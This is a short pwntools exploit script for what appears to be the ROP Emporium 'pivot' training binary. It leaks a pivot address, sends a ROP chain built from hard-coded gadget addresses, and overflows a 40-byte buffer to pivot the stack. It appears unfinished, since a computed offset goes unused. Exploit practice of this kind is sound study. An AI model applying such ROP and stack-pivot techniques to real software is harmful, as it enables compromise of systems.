import sys
from pwn import *


binary = './pivot'


io = process(binary)

main = 0x400847

puts = 0x4006e0

libpivot_ret2win = 0x00100a81
libpivot_foothold = 0x0010096a
ret2win_offset = libpivot_foothold - libpivot_ret2win

foothold_plt= 0x400720
foothold_got_plt = 0x601040

pop_rdi = 0x400a33
ret = 0x4006b6

first_payload = p64(foothold_plt)
first_payload += p64(pop_rdi)
first_payload += p64(foothold_plt)
first_payload += p64(ret)
first_payload += p64(puts)
first_payload += p64(main)
#first_payload += p64()


padding = b'a' * 40
second_payload = padding

print("====================================================")
print(io.recvuntil(b'pivot:').decode())
pivot_addr = io.recvline().strip().decode()
print('<=>Parameter Address:', pivot_addr)
print(io.recv().decode())
io.sendline(first_payload)
print(io.recv().decode())
io.sendline(second_payload + p64(int(pivot_addr,16)))
print(second_payload + p64(int(pivot_addr,16)))
print(io.recv().decode())
print("====================================================")
